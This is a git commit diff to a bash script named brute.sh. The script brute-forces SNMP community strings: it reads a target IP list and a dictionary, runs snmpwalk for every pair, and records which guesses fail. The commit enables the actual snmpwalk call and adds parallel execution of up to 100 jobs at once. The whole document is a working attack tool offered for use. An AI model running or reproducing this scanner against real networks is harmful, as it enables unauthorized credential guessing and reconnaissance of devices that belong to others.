ff38d7fadeaf06708bb67e3317fbf1226f3726ee
cimc0n <len4ik.vs@gmail.com>
2021-02-06 20:10:31 +0200

    Update brute.sh
    multithread

--- brute.sh
+++ brute.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 file_ip="target.txt"
 file_dic="dic.txt"
-delay=1
+thread=100
 ####################
 function ReadFile
 { 
@@ -15,8 +15,7 @@ echo $(echo ${list[*]}| tr " " "\n" | sort -R)
 ####################
 function TestSNMP
 {
-    echo $2 $1
-#answer=$(snmpwalk -c $1 $2 1.3.6.1.2.1.1.1.0)
+answer=$(snmpwalk -c $1 $2 1.3.6.1.2.1.1.1.0)
 if [[ $answer == "" ]]; then
  echo "$2 $1" >> bad_result
 else
@@ -27,3 +26,20 @@ fi
 
 target=( $(ReadFile $file_ip))
 dic=( $(ReadFile $file_dic))
+
+
+for value in "${dic[@]}"
+do
+echo $value
+
+for ip in "${target[@]}"
+do
+  while [`jobs | wc -l` -ge $thread ]
+  do
+    sleep 5
+  echo $(jobs | wc -l)  
+  done
+    TestSNMP $value $ip &
+done
+
+done
